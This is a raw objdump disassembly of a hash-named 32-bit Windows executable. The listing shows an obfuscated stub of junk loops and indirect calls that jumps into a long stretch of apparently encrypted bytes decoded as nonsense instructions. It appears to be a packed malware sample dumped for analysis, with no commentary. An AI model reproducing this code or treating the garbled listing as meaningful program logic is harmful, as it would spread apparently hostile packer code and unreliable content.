
5102704737907e935718976d2823f8c926c247f01d9d136e3823500b1c054c1c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	add    DWORD PTR ds:0x43200c,edi
  40100f:	push   esi
  401010:	push   edi
  401011:	mov    ecx,DWORD PTR ds:0x41c37f
  401017:	xor    eax,eax
  401019:	or     eax,DWORD PTR ds:0x423827
  40101f:	sub    ecx,eax
  401021:	xor    ecx,DWORD PTR [ecx+eax*1]
  401024:	mov    eax,ds:0x41c553
  401029:	mov    DWORD PTR ds:0x431000,0x12
  401033:	cmp    DWORD PTR ds:0x431000,0x0
  40103a:	je     0x40107c
  401040:	cmp    DWORD PTR ds:0x431000,0x1f
  401047:	jne    0x401058
  40104d:	push   0x7023
  401052:	call   DWORD PTR ds:0x42a018
  401058:	mov    edi,DWORD PTR ds:0x431000
  40105e:	dec    edi
  40105f:	mov    DWORD PTR ds:0x431000,edi
  401065:	jmp    0x401033
  40106a:	mov    edi,DWORD PTR ds:0x42f014
  401070:	add    edi,DWORD PTR ds:0x42e014
  401076:	mov    DWORD PTR ds:0x42f014,edi
  40107c:	mov    DWORD PTR [ebp-0x2c],eax
  40107f:	mov    eax,ds:0x41c65f
  401084:	xor    ecx,DWORD PTR ds:0x42f008
  40108a:	mov    DWORD PTR [ebp-0x44],eax
  40108d:	and    DWORD PTR ds:0x43100c,0x0
  401097:	xor    edi,edi
  401099:	or     edi,DWORD PTR ds:0x43100c
  40109f:	inc    edi
  4010a0:	mov    DWORD PTR ds:0x43100c,edi
  4010a6:	cmp    DWORD PTR ds:0x43100c,0xb
  4010ad:	jne    0x4010d5
  4010b3:	push   0x4238fb
  4010b8:	push   0x683b
  4010bd:	push   0x2fc1
  4010c2:	push   0x62a0
  4010c7:	push   0x83ed
  4010cc:	push   DWORD PTR [ebp-0x24]
  4010cf:	call   DWORD PTR ds:0x42a01c
  4010d5:	cmp    DWORD PTR ds:0x43100c,0xa
  4010dc:	jne    0x4010ef
  4010e2:	mov    edi,DWORD PTR ds:0x43100c
  4010e8:	inc    edi
  4010e9:	mov    DWORD PTR ds:0x43100c,edi
  4010ef:	cmp    DWORD PTR ds:0x43100c,0x1a
  4010f6:	jb     0x401097
  4010fc:	sbb    eax,0x1431
  401101:	and    DWORD PTR [ebp-0x40],0x0
  401105:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40110c:	or     DWORD PTR ds:0x431018,edi
  401112:	mov    DWORD PTR [ebp-0x3c],0xf89c85b9
  401119:	mov    eax,DWORD PTR [ebp-0x1c]
  40111c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40111f:	and    DWORD PTR ds:0x431008,0x0
  401129:	jmp    0x40113b
  40112e:	mov    esi,DWORD PTR ds:0x431008
  401134:	inc    esi
  401135:	mov    DWORD PTR ds:0x431008,esi
  40113b:	cmp    DWORD PTR ds:0x431008,0x1b
  401142:	jae    0x40116e
  401148:	cmp    DWORD PTR ds:0x431008,0x22
  40114f:	jne    0x401163
  401155:	push   0x42386e
  40115a:	push   DWORD PTR [ebp-0x10]
  40115d:	call   DWORD PTR ds:0x42a020
  401163:	jmp    0x40112e
  401168:	adc    DWORD PTR ds:0x43200c,ebx
  40116e:	xor    eax,ecx
  401170:	mov    DWORD PTR [ebp-0x1c],eax
  401173:	mov    DWORD PTR ds:0x430018,0x11
  40117d:	cmp    DWORD PTR ds:0x430018,0x0
  401184:	je     0x4011be
  40118a:	cmp    DWORD PTR ds:0x430018,0x1e
  401191:	jne    0x4011aa
  401197:	push   0x5187
  40119c:	push   0x42f014
  4011a1:	push   DWORD PTR [ebp-0xc]
  4011a4:	call   DWORD PTR ds:0x42a024
  4011aa:	xor    esi,esi
  4011ac:	or     esi,DWORD PTR ds:0x430018
  4011b2:	dec    esi
  4011b3:	mov    DWORD PTR ds:0x430018,esi
  4011b9:	jmp    0x40117d
  4011be:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011c5:	mov    eax,DWORD PTR [ebp-0x28]
  4011c8:	and    DWORD PTR ds:0x42f010,0x0
  4011d2:	jmp    0x4011e6
  4011d7:	xor    edi,edi
  4011d9:	xor    edi,DWORD PTR ds:0x42f010
  4011df:	inc    edi
  4011e0:	mov    DWORD PTR ds:0x42f010,edi
  4011e6:	cmp    DWORD PTR ds:0x42f010,0x19
  4011ed:	jae    0x401210
  4011f3:	cmp    DWORD PTR ds:0x42f010,0x29
  4011fa:	jne    0x40120b
  401200:	push   0x423927
  401205:	call   DWORD PTR ds:0x42a028
  40120b:	jmp    0x4011d7
  401210:	mov    ecx,DWORD PTR [ebp-0x28]
  401213:	mov    edi,DWORD PTR ds:0x42f014
  401219:	add    DWORD PTR ds:0x42f004,edi
  40121f:	xor    eax,ecx
  401221:	adc    DWORD PTR ds:0x42e00c,ecx
  401227:	mov    DWORD PTR [ebp-0x28],eax
  40122a:	adc    eax,ecx
  40122c:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  401233:	mov    eax,DWORD PTR [ebp-0x14]
  401236:	and    DWORD PTR ds:0x42e000,0x0
  401240:	mov    edi,DWORD PTR ds:0x42e000
  401246:	inc    edi
  401247:	mov    DWORD PTR ds:0x42e000,edi
  40124d:	cmp    DWORD PTR ds:0x42e000,0x1d
  401254:	jne    0x40126a
  40125a:	push   0x43201c
  40125f:	push   0x1888
  401264:	call   DWORD PTR ds:0x42a02c
  40126a:	cmp    DWORD PTR ds:0x42e000,0x1a
  401271:	jb     0x401240
  401277:	mov    ecx,DWORD PTR [ebp-0x14]
  40127a:	and    DWORD PTR ds:0x430014,0x0
  401284:	jmp    0x401296
  401289:	mov    edi,DWORD PTR ds:0x430014
  40128f:	inc    edi
  401290:	mov    DWORD PTR ds:0x430014,edi
  401296:	cmp    DWORD PTR ds:0x430014,0x15
  40129d:	jae    0x4012d8
  4012a3:	cmp    DWORD PTR ds:0x430014,0xb
  4012aa:	jne    0x4012b9
  4012b0:	push   DWORD PTR [ebp-0x14]
  4012b3:	call   DWORD PTR ds:0x42a030
  4012b9:	cmp    DWORD PTR ds:0x430014,0xa
  4012c0:	jne    0x4012d3
  4012c6:	mov    edi,DWORD PTR ds:0x430014
  4012cc:	inc    edi
  4012cd:	mov    DWORD PTR ds:0x430014,edi
  4012d3:	jmp    0x401289
  4012d8:	xor    eax,ecx
  4012da:	sub    DWORD PTR ds:0x432010,edi
  4012e0:	mov    DWORD PTR [ebp-0x14],eax
  4012e3:	add    DWORD PTR [ebp-0x14],0xf89c85f6
  4012ea:	mov    eax,DWORD PTR [ebp-0x24]
  4012ed:	mov    ecx,DWORD PTR [ebp-0x24]
  4012f0:	xor    eax,ecx
  4012f2:	or     DWORD PTR ds:0x430010,edi
  4012f8:	mov    DWORD PTR [ebp-0x24],eax
  4012fb:	not    eax
  4012fd:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401304:	or     DWORD PTR ds:0x430018,0x1732
  40130e:	mov    eax,DWORD PTR [ebp-0x18]
  401311:	and    DWORD PTR ds:0x42e000,ebx
  401317:	mov    ecx,DWORD PTR [ebp-0x18]
  40131a:	xor    eax,ecx
  40131c:	and    DWORD PTR ds:0x42e008,0x0
  401326:	jmp    0x401338
  40132b:	mov    esi,DWORD PTR ds:0x42e008
  401331:	inc    esi
  401332:	mov    DWORD PTR ds:0x42e008,esi
  401338:	cmp    DWORD PTR ds:0x42e008,0x16
  40133f:	jae    0x40137a
  401345:	cmp    DWORD PTR ds:0x42e008,0x4
  40134c:	jne    0x40135b
  401352:	push   DWORD PTR [ebp-0x1c]
  401355:	call   DWORD PTR ds:0x42a034
  40135b:	cmp    DWORD PTR ds:0x42e008,0x3
  401362:	jne    0x401375
  401368:	mov    esi,DWORD PTR ds:0x42e008
  40136e:	inc    esi
  40136f:	mov    DWORD PTR ds:0x42e008,esi
  401375:	jmp    0x40132b
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	mov    eax,DWORD PTR [ebp-0x20]
  401380:	mov    ecx,DWORD PTR [ebp-0x18]
  401383:	mov    esi,0x7510891
  401388:	xor    eax,esi
  40138a:	mov    edi,0x3272d9
  40138f:	add    eax,edi
  401391:	xor    eax,ecx
  401393:	mov    DWORD PTR [ebp-0x18],eax
  401396:	mov    eax,DWORD PTR [ebp-0x10]
  401399:	mov    ecx,DWORD PTR [ebp-0x10]
  40139c:	sub    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x10],eax
  4013a1:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  4013a8:	mov    al,BYTE PTR [ebp-0x1]
  4013ab:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013af:	movzx  eax,al
  4013b2:	sub    ecx,eax
  4013b4:	mov    BYTE PTR [ebp-0x1],cl
  4013b7:	movzx  eax,BYTE PTR [ebp-0x1]
  4013bb:	xor    eax,0xffffff99
  4013be:	mov    BYTE PTR [ebp-0x1],al
  4013c1:	mov    eax,DWORD PTR [ebp-0x20]
  4013c4:	xor    eax,esi
  4013c6:	add    eax,edi
  4013c8:	mov    DWORD PTR [ebp-0x18],eax
  4013cb:	lea    eax,[ebp-0x38]
  4013ce:	mov    DWORD PTR [ebp-0x30],eax
  4013d1:	lea    eax,[ebp-0x30]
  4013d4:	mov    DWORD PTR [ebp-0x34],eax
  4013d7:	lea    eax,[ebp-0x34]
  4013da:	mov    DWORD PTR [ebp-0xc],eax
  4013dd:	lea    eax,[ebp-0xc]
  4013e0:	jmp    0x40379a
  4013e5:	out    0x1a,al
  4013e7:	(bad)  
  4013e8:	jle    0x40138c
  4013ea:	mov    dl,0x66
  4013ec:	loop   0x401463
  4013ee:	jmp    0x401410
  4013f0:	jae    0x4013ab
  4013f2:	sub    dl,BYTE PTR [edx+0x6060607b]
  4013f8:	pusha  
  4013f9:	lds    ebx,FWORD PTR [edi+0x60]
  4013fc:	pusha  
  4013fd:	or     DWORD PTR [ebx],ebp
  4013ff:	pop    es
  401400:	pop    eax
  401401:	add    eax,0x792a0354
  401406:	pop    ebx
  401407:	jne    0x401450
  401409:	fbstp  TBYTE PTR [edx]
  40140b:	jo     0x40144f
  40140d:	jno    0x401434
  40140f:	iret   
  401410:	retf   
  401411:	repnz inc ebp
  401413:	rcl    BYTE PTR [edi+0x5a280399],cl
  401419:	jno    0x401483
  40141b:	mov    WORD PTR [eax-0x45be3d9e],es
  401421:	daa    
  401422:	mov    ecx,0x54f9427
  401427:	scas   al,BYTE PTR es:[edi]
  401428:	push   0x5
  40142a:	add    BYTE PTR [eax],dl
  40142c:	mov    bh,0xdd
  40142f:	ins    BYTE PTR es:[edi],dx
  401430:	xchg   BYTE PTR [esi],bh
  401432:	xchg   esp,eax
  401433:	mov    ds,WORD PTR [esi]
  401435:	leave  
  401436:	xor    DWORD PTR [edi+ebx*8-0x50],ecx
  40143a:	jae    0x401405
  40143c:	xor    ebx,DWORD PTR [ebp+0x4e76468c]
  401442:	mov    ah,0x4f
  401444:	call   0x6604:0xfb887356
  40144b:	push   edx
  40144c:	cmp    eax,0x365cc72a
  401451:	push   eax
  401452:	push   0x3
  401454:	unpcklps xmm7,XMMWORD PTR [ebp+0x27]
  401458:	mov    ebx,0xa4ab63c3
  40145d:	mov    edx,0xc531c091
  401462:	stc    
  401463:	inc    ebx
  401464:	popf   
  401465:	nop
  401466:	in     eax,0x10
  401468:	fstp   QWORD PTR [eax]
  40146a:	jg     0x401408
  40146c:	cmp    ecx,edi
  40146e:	mov    esi,0xdb9e8069
  401473:	dec    ecx
  401474:	loopne 0x40142f
  401476:	pop    esi
  401477:	or     BYTE PTR [ebx],0x2a
  40147a:	inc    ebx
  40147b:	pop    ecx
  40147c:	mov    ecx,0xd8163603
  401481:	xor    ebx,DWORD PTR [eax+eiz*1+0x18]
  401485:	sub    cl,BYTE PTR [ebx]
  401487:	inc    esp
  401488:	add    edi,DWORD PTR [esi-0x32db71e1]
  40148e:	dec    ebp
  40148f:	outs   dx,BYTE PTR ds:[esi]
  401490:	xchg   edi,eax
  401491:	dec    esp
  401492:	mov    cl,0x25
  401494:	pop    ecx
  401495:	ret    0x2926
  401498:	mov    ch,0xc1
  40149b:	fld    DWORD PTR [edi-0x25]
  40149e:	mov    edi,0xdb04aeab
  4014a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014a4:	jl     0x401506
  4014a6:	xchg   ebp,eax
  4014a7:	inc    esp
  4014a8:	sbb    ecx,DWORD PTR [ebx+0x1cc0e524]
  4014ae:	sub    DWORD PTR [ebp+0x6a],0x51
  4014b2:	imul   ebp,eax,0xe0ae0ab2
  4014b8:	mov    cs,eax
  4014ba:	mov    ds:0x401a4787,eax
  4014bf:	pusha  
  4014c0:	inc    ecx
  4014c1:	fcom   DWORD PTR [edx-0x335d1f1f]
  4014c7:	retf   0x3aa5
  4014ca:	dec    eax
  4014cb:	fisubr WORD PTR [ebp+0x8a45d9c]
  4014d1:	and    esp,DWORD PTR [edi-0x10]
  4014d4:	(bad)  
  4014d5:	outs   dx,DWORD PTR ds:[esi]
  4014d6:	or     edx,DWORD PTR [eax]
  4014d8:	inc    ebx
  4014d9:	xor    edx,DWORD PTR [ecx]
  4014db:	jmp    0x4014c2
  4014dd:	loopne 0x4014d0
  4014df:	and    bh,BYTE PTR [edi+0x63691277]
  4014e5:	dec    esi
  4014e6:	cmc    
  4014e7:	sti    
  4014e8:	mov    dh,0xbf
  4014ea:	and    al,0x3
  4014ec:	sub    eax,0xaf316363
  4014f1:	sti    
  4014f2:	mov    esi,0xa96e69d3
  4014f7:	ins    DWORD PTR es:[edi],dx
  4014f8:	mov    eax,ds:0x79631a3e
  4014fd:	ins    BYTE PTR es:[edi],dx
  4014fe:	and    eax,0x7d6c21a0
  401503:	mov    bh,0x9
  401505:	dec    ecx
  401506:	xor    eax,0xe3d517b1
  40150b:	adc    eax,0xa1a084b1
  401510:	rol    cl,1
  401512:	mov    ecx,0x88cc5bac
  401517:	das    
  401518:	mov    dl,0x6c
  40151a:	call   0x51df9c97
  40151f:	and    bh,bl
  401521:	jnp    0x40155f
  401523:	lock jle 0x401538
  401526:	outs   dx,DWORD PTR ds:[esi]
  401527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401528:	push   eax
  401529:	loopne 0x40151b
  40152b:	(bad)  
  40152c:	pop    ds
  40152d:	loopne 0x401563
  40152f:	dec    edx
  401530:	jmp    0xd00561d
  401535:	jns    0x4014f1
  401537:	fstp   TBYTE PTR [ebx+0x7e0a4a82]
  40153d:	retw   
  40153f:	je     0x4015a6
  401541:	aas    
  401542:	inc    ebp
  401543:	adc    BYTE PTR [edi-0x76c5d431],dl
  401549:	sbb    al,0x64
  40154b:	lahf   
  40154c:	pop    ds
  40154d:	push   eax
  40154e:	call   0xe15e:0xc0cff040
  401555:	inc    al
  401557:	mov    ecx,0x9f5b8682
  40155c:	aas    
  40155d:	adc    al,0x79
  40155f:	jg     0x401571
  401561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401562:	stos   DWORD PTR es:[edi],eax
  401563:	jae    0x4015ac
  401565:	pop    ebp
  401566:	cmp    bh,BYTE PTR [edx-0x6c074c3f]
  40156c:	stc    
  40156d:	push   0xb
  40156f:	jno    0x401597
  401571:	(bad)  
  401572:	retf   
  401573:	ds push es
  401575:	sub    eax,0x5b1da814
  40157a:	leave  
  40157b:	add    ecx,DWORD PTR [edi]
  40157d:	pushf  
  40157e:	dec    eax
  40157f:	pusha  
  401580:	es xchg edx,eax
  401582:	cdq    
  401583:	adc    edi,ebx
  401585:	dec    edx
  401586:	mov    ch,0x53
  401588:	push   eax
  401589:	jne    0x40154e
  40158b:	fisttp DWORD PTR [ecx+0x7c31616c]
  401591:	dec    ebp
  401592:	and    BYTE PTR [esi],0xfc
  401595:	xchg   ecx,eax
  401596:	repz jne 0x40153b
  401599:	cmp    al,0x2f
  40159b:	push   ds
  40159c:	fcom   QWORD PTR [edx+eiz*4+0x24]
  4015a0:	jae    0x401602
  4015a2:	lahf   
  4015a3:	mov    bh,0x46
  4015a5:	mov    esp,0x3e59e83c
  4015aa:	out    0x40,eax
  4015ac:	ret    0xb0dd
  4015af:	mov    DWORD PTR [edi-0x37],esp
  4015b2:	ss dec eax
  4015b5:	mov    eax,ds:0xa72458b3
  4015ba:	daa    
  4015bb:	retf   0xadc4
  4015be:	mov    es,WORD PTR [ebx]
  4015c0:	mov    WORD PTR [ecx+0x4b9351c9],fs
  4015c6:	jg     0x40156b
  4015c8:	push   esi
  4015c9:	fst    QWORD PTR [eax+ebx*4-0x2d]
  4015cd:	je     0x40156d
  4015cf:	rol    WORD PTR [esi+0x1425810c],1
  4015d6:	xor    ah,BYTE PTR [edi+0x5e]
  4015d9:	sub    ch,dh
  4015db:	ss mov ebp,0x37eed943
  4015e1:	ins    DWORD PTR es:[edi],dx
  4015e2:	stos   DWORD PTR es:[edi],eax
  4015e3:	mov    ds,WORD PTR [ecx+0x6613fd9c]
  4015e9:	cli    
  4015ea:	push   ss
  4015eb:	leave  
  4015ec:	jg     0x40161a
  4015ee:	daa    
  4015ef:	inc    ebp
  4015f0:	pop    es
  4015f1:	mov    bh,0x64
  4015f3:	sbb    BYTE PTR [eax-0x7b],0xb4
  4015f7:	push   ebx
  4015f8:	loop   0x4015c6
  4015fa:	loop   0x401612
  4015fc:	dec    ebp
  4015fd:	pop    ebx
  4015fe:	int    0xe3
  401600:	jno    0x401649
  401602:	inc    eax
  401603:	call   0x41268dcd
  401608:	int    0x11
  40160a:	push   ds
  40160b:	jno    0x4015b5
  40160d:	retf   0xe6fe
  401610:	cwde   
  401611:	mov    ch,dh
  401613:	pop    edx
  401614:	retf   
  401615:	adc    ebx,edi
  401617:	inc    edi
  401618:	pop    ebp
  401619:	aas    
  40161a:	jmp    0x9309:0x9098ed00
  401621:	push   es
  401622:	inc    ecx
  401623:	rcr    BYTE PTR ds:0x4c78bb22,0x32
  40162a:	mov    bl,0x5f
  40162c:	shl    BYTE PTR [ebx+0x55],0xc9
  401630:	xlat   BYTE PTR ds:[ebx]
  401631:	mov    dl,0x1a
  401633:	and    BYTE PTR [ecx-0x59],ah
  401636:	call   0xc29fa504
  40163b:	lahf   
  40163c:	test   BYTE PTR [ecx-0xd],cl
  40163f:	cdq    
  401640:	pop    ss
  401641:	cmp    DWORD PTR [ebp*2-0x5c2c5afa],edi
  401648:	and    BYTE PTR [edi+0x1a],ah
  40164b:	ins    BYTE PTR es:[edi],dx
  40164c:	dec    esp
  40164d:	mov    esi,0x4a61c89d
  401652:	cmp    DWORD PTR [ebx+edi*2],esi
  401655:	imul   eax,DWORD PTR [ecx+ebp*1+0x303f046c],0x2f
  40165d:	cwde   
  40165e:	mov    es,ebp
  401660:	dec    edi
  401661:	jnp    0x40163f
  401663:	stc    
  401664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401665:	dec    eax
  401666:	add    eax,0xf28e2b8d
  40166b:	xor    DWORD PTR [edi-0x4c99ad5],0x962a8721
  401675:	push   ebx
  401676:	and    al,0x2a
  401678:	sub    ebx,DWORD PTR [ecx-0x4db3cf26]
  40167e:	cmp    eax,0xc80e667f
  401683:	inc    esp
  401684:	sti    
  401685:	push   ebx
  401686:	mov    esi,0xc32af11d
  40168b:	adc    eax,0x897a2f74
  401690:	pop    edx
  401691:	repz fcos 
  401694:	add    eax,0xeb588a6e
  401699:	shl    DWORD PTR [ecx],0x1
  40169c:	jne    0x401621
  40169e:	mov    ebp,0xfaea3c74
  4016a3:	jecxz  0x4016cc
  4016a5:	out    dx,eax
  4016a6:	mov    edi,0x2dbefc4c
  4016ab:	mov    BYTE PTR [eax-0x75],dh
  4016ae:	(bad)  
  4016b0:	mov    cl,0x5a
  4016b2:	fwait
  4016b3:	xchg   BYTE PTR [eax],bh
  4016b5:	push   ss
  4016b6:	mov    bh,0xb
  4016b8:	shl    BYTE PTR [ebp-0x15b1391],0x3e
  4016bf:	jbe    0x40168d
  4016c1:	outs   dx,BYTE PTR ds:[esi]
  4016c2:	rcl    DWORD PTR gs:0x19919ccf,0x3
  4016ca:	adc    edx,DWORD PTR [edx+0xa76c8aa]
  4016d0:	sub    edi,DWORD PTR [edx+0x3f44264d]
  4016d6:	aas    
  4016d7:	xchg   ecx,eax
  4016d8:	sub    DWORD PTR [edi-0x9e5cbf6],esp
  4016de:	jmp    0xcc9bb977
  4016e3:	mov    cs,eax
  4016e5:	ins    BYTE PTR es:[edi],dx
  4016e6:	inc    ebp
  4016e7:	es dec ebp
  4016e9:	cmp    ebp,esi
  4016eb:	fiadd  DWORD PTR [ecx+0x68]
  4016ee:	call   FWORD PTR [ecx-0x2f]
  4016f1:	sti    
  4016f2:	xchg   edx,eax
  4016f3:	adc    bh,BYTE PTR [ebx-0x6e5b9786]
  4016f9:	imul   esi,ebx,0x14caa4a1
  4016ff:	fs mov esp,0x8bb3922e
  401705:	cwde   
  401706:	leave  
  401707:	and    BYTE PTR [ebx+0x2],ch
  40170a:	ss iret 
  40170c:	sub    BYTE PTR [esi+0x64],0xc4
  401710:	pop    ebx
  401711:	mov    eax,0x66d7d2c9
  401716:	sbb    eax,0x58848314
  40171b:	mov    bh,0x90
  40171d:	dec    edi
  40171e:	jge    0x4016bb
  401720:	pusha  
  401721:	das    
  401722:	(bad)  
  401723:	cmp    eax,0xb8dd0bcc
  401728:	inc    ebx
  401729:	xchg   DWORD PTR ds:0xfa128d2e,edi
  40172f:	sub    DWORD PTR [edx+0x39401bc7],0x999a3f17
  401739:	pop    ebp
  40173a:	and    al,0x93
  40173c:	(bad)  
  40173d:	inc    DWORD PTR [esi-0x6fde78da]
  401743:	xchg   esp,eax
  401744:	or     cl,BYTE PTR [eax+edx*4+0x4666b552]
  40174b:	xchg   esi,eax
  40174c:	mov    eax,ds:0x6cdcaf94
  401751:	mov    ecx,DWORD PTR [edi]
  401753:	fisttp WORD PTR [eax-0x45e3d500]
  401759:	dec    ebx
  40175a:	or     eax,0xb7ea3062
  40175f:	inc    ecx
  401760:	push   edi
  401761:	inc    edx
  401762:	mov    ebp,0x1762945e
  401767:	scas   al,BYTE PTR es:[edi]
  401768:	pop    eax
  401769:	cdq    
  40176a:	xchg   ecx,eax
  40176b:	adc    BYTE PTR [ebx+0x69cd6eb6],al
  401771:	mov    ebp,DWORD PTR [edx-0x42]
  401774:	adc    BYTE PTR [edx-0x3da7830c],0xc5
  40177b:	popf   
  40177c:	xchg   ebx,eax
  40177d:	and    DWORD PTR [ebx-0x1236a7a2],ecx
  401783:	mov    al,0x6b
  401785:	push   ds
  401786:	(bad)  
  401787:	jae    0x4017ca
  401789:	cmc    
  40178a:	mov    eax,0xac854cc5
  40178f:	pop    ss
  401790:	retf   
  401791:	imul   ebp,DWORD PTR cs:[eax],0x917c53c5
  401798:	adc    BYTE PTR [ebx],cl
  40179a:	gs iret 
  40179c:	sar    esi,cl
  40179e:	mov    bh,0x7b
  4017a0:	adc    al,0xf6
  4017a2:	aaa    
  4017a3:	ffree  st(5)
  4017a5:	add    eax,0x8588ce27
  4017aa:	push   edi
  4017ab:	lahf   
  4017ac:	dec    edi
  4017ad:	mov    al,0x51
  4017af:	jbe    0x4017cc
  4017b1:	add    ah,bl
  4017b3:	sti    
  4017b4:	fs xor al,0xc2
  4017b7:	shl    BYTE PTR [ecx+0x54],cl
  4017ba:	push   ebp
  4017bb:	push   ebx
  4017bc:	mov    edi,0xce9b515b
  4017c1:	int    0x6a
  4017c3:	mov    al,ds:0x74ccedec
  4017c8:	jmp    0x4017a9
  4017ca:	bound  esi,QWORD PTR [eax+0x48]
  4017cd:	fnstcw WORD PTR ds:0xfdc169ee
  4017d3:	push   ecx
  4017d4:	ins    DWORD PTR es:[edi],dx
  4017d5:	nop
  4017d6:	sti    
  4017d7:	ins    DWORD PTR es:[edi],dx
  4017d8:	pop    eax
  4017d9:	xchg   ebx,eax
  4017da:	jmp    ecx
  4017dc:	push   0x5bec42d6
  4017e1:	neg    ebx
  4017e3:	dec    esi
  4017e4:	sub    al,0x40
  4017e6:	scas   al,BYTE PTR es:[edi]
  4017e7:	(bad)  
  4017e8:	cmp    eax,0x1232e920
  4017ed:	and    edx,esi
  4017ef:	cmc    
  4017f0:	sub    BYTE PTR [eax+0x2d4c9174],bh
  4017f6:	and    al,0xae
  4017f8:	mov    dl,0xea
  4017fa:	adc    BYTE PTR [edi+edi*1-0x29],ah
  4017fe:	sbb    BYTE PTR ds:0xa13df3ad,bh
  401804:	xchg   edx,eax
  401805:	dec    esp
  401806:	and    ebx,0x5
  401809:	stos   BYTE PTR es:[edi],al
  40180a:	(bad)  
  40180b:	not    BYTE PTR [esi+0x3d]
  40180e:	pop    edx
  40180f:	in     al,0x87
  401811:	push   ebp
  401812:	and    cl,BYTE PTR [edi]
  401814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401815:	mov    ebx,0x8d44c80b
  40181a:	mov    eax,ds:0x4ba60084
  40181f:	rcl    BYTE PTR [bp+si-0x60],0x6f
  401824:	inc    eax
  401825:	xor    BYTE PTR [edi+edx*1-0xe98b24a],al
  40182c:	imul   edx,DWORD PTR [ebx],0xffffff89
  40182f:	or     cl,BYTE PTR [ecx]
  401831:	test   eax,0xd4dcc65c
  401836:	pop    eax
  401837:	or     DWORD PTR [edx+0x2c],ebx
  40183a:	pop    ss
  40183b:	and    bl,dh
  40183d:	stos   DWORD PTR es:[edi],eax
  40183e:	(bad)  
  40183f:	xchg   edx,eax
  401840:	cmp    edx,DWORD PTR [esi+0x4f0d70bb]
  401846:	push   eax
  401847:	ja     0x4017fe
  401849:	in     eax,dx
  40184a:	mov    dh,0xd0
  40184c:	sub    al,0x87
  40184e:	mov    al,ds:0x47a9a82d
  401853:	and    edi,DWORD PTR [esi]
  401855:	adc    DWORD PTR [ebp+0x1e77e8a1],esp
  40185b:	adc    cl,BYTE PTR [eax+0x72]
  40185e:	xchg   edx,eax
  40185f:	and    bh,BYTE PTR [ecx-0x64e78f7b]
  401865:	mov    ds:0x86ee0c1a,al
  40186a:	inc    esi
  40186b:	mov    bl,0x3d
  40186d:	(bad)  
  40186e:	in     al,dx
  40186f:	and    al,0xa8
  401871:	cmp    ebx,DWORD PTR [esi-0x5b6b4232]
  401877:	xchg   BYTE PTR [ecx],bl
  401879:	dec    esp
  40187a:	mov    eax,ds:0x7ccaebfe
  40187f:	dec    edi
  401880:	test   al,0xf0
  401882:	pop    ebp
  401883:	fs int3 
  401885:	add    al,0x13
  401887:	jae    0x4018cf
  401889:	clc    
  40188a:	sbb    ebx,DWORD PTR [ebp+0x32]
  40188d:	enter  0xf1e6,0xb5
  401891:	ret    0x5732
  401894:	ficom  WORD PTR [esi+0x9b70735]
  40189a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40189b:	(bad)  
  40189c:	scas   al,BYTE PTR es:[edi]
  40189d:	(bad)
  4018a0:	test   al,0xe5
  4018a2:	or     BYTE PTR [ebp+0x40],0x60
  4018a6:	cmp    dl,dh
  4018a8:	push   edi
  4018a9:	(bad)  
  4018aa:	retf   
  4018ab:	push   0x18
  4018ad:	xor    ebx,DWORD PTR [esi+0x9]
  4018b0:	inc    edx
  4018b1:	xchg   edi,eax
  4018b2:	dec    esp
  4018b3:	call   0x2e9eb4d5
  4018b8:	push   ebp
  4018b9:	pusha  
  4018ba:	ins    DWORD PTR es:[edi],dx
  4018bb:	lahf   
  4018bc:	sub    ch,ah
  4018be:	(bad)  
  4018bf:	mov    ds:0xa7a865e,al
  4018c4:	clc    
  4018c5:	fwait
  4018c6:	nop
  4018c7:	add    al,0xbf
  4018c9:	test   BYTE PTR [eax+eiz*1+0x4b],dl
  4018cd:	mov    eax,edx
  4018cf:	leave  
  4018d0:	scas   al,BYTE PTR es:[edi]
  4018d1:	add    DWORD PTR [edx],0xffffff9e
  4018d4:	mov    WORD PTR [ebx],gs
  4018d6:	(bad)  
  4018d7:	dec    esp
  4018d8:	pop    ecx
  4018d9:	mov    eax,ds:0xd8dc9af2
  4018de:	sbb    BYTE PTR [edx-0x5e],cl
  4018e1:	out    0x34,eax
  4018e3:	call   0x60e03b3b
  4018e8:	bound  edx,QWORD PTR [ecx+0x34]
  4018eb:	or     DWORD PTR [eax-0xa],0x4d
  4018ef:	pop    ecx
  4018f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018f1:	push   ebx
  4018f2:	sti    
  4018f3:	stos   BYTE PTR es:[edi],al
  4018f4:	cdq    
  4018f5:	sbb    DWORD PTR ds:0x8c434edd,0xe2337ef1
  4018ff:	push   0x396bff19
  401904:	xchg   ecx,eax
  401905:	sub    BYTE PTR [ecx-0x14],dl
  401908:	pop    ds
  401909:	out    dx,al
  40190a:	inc    edx
  40190b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40190c:	loope  0x4018ac
  40190e:	adc    eax,0x1bf89c31
  401913:	aas    
  401914:	(bad)  
  401915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401916:	xchg   ebp,eax
  401917:	adc    eax,0xadc53bf9
  40191c:	pop    esi
  40191d:	and    dl,dl
  40191f:	xchg   ebp,eax
  401920:	adc    BYTE PTR [edx+ecx*4+0x40],0x40
  401925:	dec    ecx
  401926:	xchg   esp,eax
  401927:	and    BYTE PTR [eax-0x1e],al
  40192a:	lea    edx,[ecx]
  40192c:	xchg   edx,eax
  40192d:	sahf   
  40192e:	rcl    DWORD PTR cs:[esi],cl
  401931:	jmp    0x3201:0xdb566f0d
  401938:	(bad)  
  401939:	out    dx,eax
  40193a:	loope  0x4019a7
  40193c:	ds in  al,dx
  40193e:	dec    BYTE PTR [ecx]
  401940:	adc    BYTE PTR [ecx],0xf
